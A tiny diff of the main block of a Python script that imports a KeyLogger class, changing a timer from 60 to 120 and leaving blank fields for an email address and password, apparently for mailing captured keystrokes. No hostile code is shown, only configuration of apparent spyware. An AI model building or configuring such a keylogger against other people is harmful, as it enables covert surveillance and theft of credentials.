@@ -3,7 +3,7 @@ from keylogger import KeyLogger
 if __name__ == '__main__':
 
     # Set Up Variables
-    timer = 60
+    timer = 120
     your_email = ''
     email_pass = ''
 
